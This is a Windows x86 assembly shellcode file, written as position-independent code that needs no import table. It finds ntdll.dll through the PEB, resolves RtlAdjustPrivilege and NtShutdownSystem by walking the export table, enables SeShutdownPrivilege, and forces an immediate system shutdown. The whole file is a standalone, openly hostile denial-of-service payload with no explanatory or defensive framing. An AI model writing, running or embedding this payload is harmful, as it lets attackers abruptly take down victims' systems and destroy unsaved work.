BITS 32

global _start
section .text

_start:

; Local variables:
;
; [ebp-4] Address of ntdll.dll
; [ebp-8] Address of ntdll.dll's export table
; [ebp-12] Space for RtlAdjustPrivilege's output

push ebp
mov ebp,esp
sub esp,12

; Save registers

push ebx
push esi
push edi

jmp get_delta_offset ; Get the delta offset

get_delta_offset2:
    pop ebx
	jmp start ; Jump to main code

get_delta_offset:
    call get_delta_offset2
	
data:
    NtShutdownSystem_s db "NtShutdownSystem"
	NtShutdownSystem_len equ $-NtShutdownSystem_s
	
	RtlAdjustPrivilege_s db "RtlAdjustPrivilege"
	RtlAdjustPrivilege_len equ $-RtlAdjustPrivilege_s
	
get_function_address:

    ; Save registers

    push ebx
	push esi
	push edi
	
    mov eax,[ebp-8]
	mov ebx,[eax+0x20] ; ebx now points to the export names array
	
	add ebx,[ebp-4]
	xor eax,eax
	
	.get_function_address_loop:
	    mov esi,edx ; esi now points to the function
		mov edi,[ebx+eax*4]
		add edi,[ebp-4] ; edi now points to the export name
		
		push ecx ; Save the function name length
		cld ; Clear the direction flag
		
		rep cmpsb ; Do the comparison
		pop ecx ; Restore the length
		
		je .get_function_address_end
		inc eax
		
		cmp eax,[ebx+0x14]
		jl .get_function_address_loop
		
	.get_function_address_fail:
	    pop edi
		pop esi
		pop ebx
		
	    xor eax,eax
		ret
		
	.get_function_address_end:
		mov ebx,[ebp-8]
		mov ecx,[ebx+0x1c]
		
		add ecx,[ebp-4] ; ecx now points to the function addresses array
		
		mov edx,[ebx+0x24]
		add edx,[ebp-4] ; edx now points to the ordinals array
		
		movzx eax,word [edx+eax*2] ; eax now holds the ordinal
		mov eax,[ecx+eax*4] ; eax now holds the RVA of the function
		
		add eax,[ebp-4] ; eax now holds the address of the function
		
		; Restore registers
		
		pop edi
		pop esi
		pop ebx
		
		ret
		
start:

xor ecx,ecx
mov eax,[fs:ecx+0x30] ; eax now points to the PEB

mov eax,[eax+0xc] ; eax now points to loader data
mov eax,[eax+0x14]

mov eax,[eax+ecx]
mov eax,[eax+0x10] ; eax now holds the address of ntdll.dll

mov [ebp-4],eax ; Save the address of ntdll.dll

add eax,[eax+0x3c] ; eax now points to the PE header
mov eax,[eax+0x78] ; eax now points to the export directory
add eax,[ebp-4] ; eax now points to the export table

mov [ebp-8],eax
xor ecx,ecx

mov cl,NtShutdownSystem_len
mov edx,ebx

add ebx,ecx ; Move to next string
call get_function_address

test eax,eax
je exit

mov esi,eax
xor ecx,ecx

mov cl,RtlAdjustPrivilege_len
mov edx,ebx

call get_function_address

test eax,eax
je exit

mov edi,eax
xor eax,eax

; Enable SeShutdownPrivilege

lea ecx,[ebp-12]

push ecx
push eax ; CurrentThread = FALSE
push 1 ; Enable = TRUE
push 19 ; SeShutdownPrivilege

call edi ; Call RtlAdjustPrivilege
xor eax,eax

push eax ; ShutdownNoReboot
call esi ; Call NtShutdownSystem

exit:

pop edi
pop esi
pop ebx

mov esp,ebp
pop ebp
ret
